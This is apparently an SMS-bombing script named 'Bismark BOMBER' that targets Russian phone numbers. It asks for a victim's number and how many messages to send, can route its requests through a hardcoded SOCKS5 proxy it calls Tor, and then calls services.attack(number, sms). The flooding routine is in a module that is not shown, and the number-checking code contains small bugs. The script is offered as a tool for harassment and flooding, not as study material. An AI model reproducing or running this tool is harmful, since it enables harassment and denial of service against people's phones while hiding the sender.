import requests
import datetime
import services

#Цвета
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

#Хедер
print(f"{green}{bold}\t\t{underline}[Bismark BOMBER ]{end}")

print()
print(f"{bold}Coded by{end}", end="")
print(f"{green}{bold} >> {end}", end = "")
print(f"{cyan}{bold}yala0{end}")

print(f"{bold}VK{end}", end = "")
print(f"{green}{bold} >> {end}", end = "")
print(f"{cyan}{bold}@yala0{end}")
print()

#Ввод
print('Enter please the number without or with prefixes (+7) (8)\nExample: 9018017010')
input_number = input(green + bold + '>> ' + end)
print('How many SMS do you need to send?')
sms = int(input(green + bold + '>> ' + end))

print(f"Do you need a{cyan} TOR {end}y/n? ")
is_tor = input(bold + green + ">> " + end)


def parse_number(number):
	msg = f"[*]Checking number - {green}{bold}OK{end}"
	if int(len(number)) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]Checking number - {red}{bold}Bad number!{end}\nBismark bomber is intended only for Russian Federation")
		quit()
	return number
number = parse_number(input_number)

#tor
if str(is_tor) == "y":
        print(f"[*]Launching {cyan}{bold}Tor{end}...")
        proxies = {'http': 'socks5://139.59.53.105:1080','https': 'socks5://139.59.53.105:1080'}
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n',''))
        print(f"[*]Launchrd {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

services.attack(number, sms)
